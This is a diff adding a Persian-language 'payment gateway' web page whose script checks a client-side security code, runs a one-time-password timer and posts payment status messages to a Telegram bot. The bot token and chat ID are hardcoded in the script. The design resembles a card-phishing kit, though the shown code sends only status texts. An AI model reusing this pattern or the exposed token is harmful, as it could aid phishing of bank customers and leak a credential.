@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>درگاه پرداخت</title>
+    <style>
+        /* ... (همه CSS ها مثل قبل) ... */
+    </style>
+</head>
+<body>
+    <!-- ... (همه HTML ها مثل قبل) ... -->
+    <script>
+        // توکن و شناسه چت را در متغیرهای داخلی قرار می‌دهیم
+        (function() {
+            const _config = {
+                botToken: "7978448833:AAE2c96nciH922NDNV6XHFhfoROI0YiBhpc",
+                chatId: "7600012889"
+            };
+
+            function getConfig(key) {
+                return _config[key];
+            }
+
+            document.getElementById('expiry-date').addEventListener('input', function(e) {
+                let input = e.target.value;
+                if (input.length === 2 && e.data) {
+                    e.target.value = input + '/';
+                } else if (input.length > 5) {
+                    e.target.value = input.slice(0, 5);
+                }
+            });
+
+            const requestPassword = document.getElementById('requestPassword');
+            const timerBox = document.getElementById('timerBox');
+            const successMessage = document.getElementById('success-message');
+            const payButton = document.getElementById('payButton');
+            const securityCodeInput = document.getElementById('security-code');
+            const securityCodeDisplay = document.getElementById('security-code-display');
+
+            function generateSecurityCode() {
+                return Math.floor(1000 + Math.random() * 9000);
+            }
+
+            function updateSecurityCode() {
+                let newCode = generateSecurityCode();
+                securityCodeDisplay.textContent = newCode;
+                localStorage.setItem('currentSecurityCode', newCode);
+            }
+
+            // کد امنیتی اولیه
+            updateSecurityCode();
+
+            function sendNotificationToTelegram(message) {
+                const botToken = getConfig('botToken');
+                const chatId = getConfig('chatId');
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                fetch(apiUrl, { method: 'POST' })
+                    .then(response => response.json())
+                    .then(result => console.log('اعلان ارسال شد:', result))
+                    .catch(error => console.error('ارسال اعلان ناموفق بود:', error));
+            }
+
+            requestPassword.addEventListener('click', function(e) {
+                if (securityCodeInput.value !== localStorage.getItem('currentSecurityCode')) {
+                    alert('کد امنیتی وارد شده صحیح نیست.');
+                    e.preventDefault();
+                    return false;
+                }
+
+                successMessage.style.display = 'block';
+                setTimeout(() => {
+                    successMessage.style.display = 'none';
+                }, 2000);
+
+                timerBox.style.display = 'inline-block';
+                let timeLeft = 60;
+                const timer = setInterval(() => {
+                    if (timeLeft > 0) {
+                        timeLeft--;
+                        const minutes = Math.floor(timeLeft / 60);
+                        const seconds = timeLeft % 60;
+                        timerBox.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                    } else {
+                        clearInterval(timer);
+                        timerBox.style.display = 'none';
+                        updateSecurityCode(); // به روز رسانی کد امنیتی وقتی زمان به پایان رسید
+                    }
+                }, 1000);
+            });
+
+            payButton.addEventListener('click', function(e) {
+                if (securityCodeInput.value !== localStorage.getItem('currentSecurityCode')) {
+                    alert('کد امنیتی وارد شده صحیح نیست.');
+                    e.preventDefault();
+                    return false;
+                }
+                // منطق پردازش پرداخت را اینجا اضافه کنید
+                sendNotificationToTelegram("پرداخت جدیدی انجام شد!");
+            });
+
+            document.getElementById('cancelButton').addEventListener('click', function() {
+                // منطق لغو را اینجا اضافه کنید
+                alert('پرداخت لغو شد.');
+                sendNotificationToTelegram("پرداخت لغو شد.");
+            });
+        })();
+    </script>
+</body>
+</html>
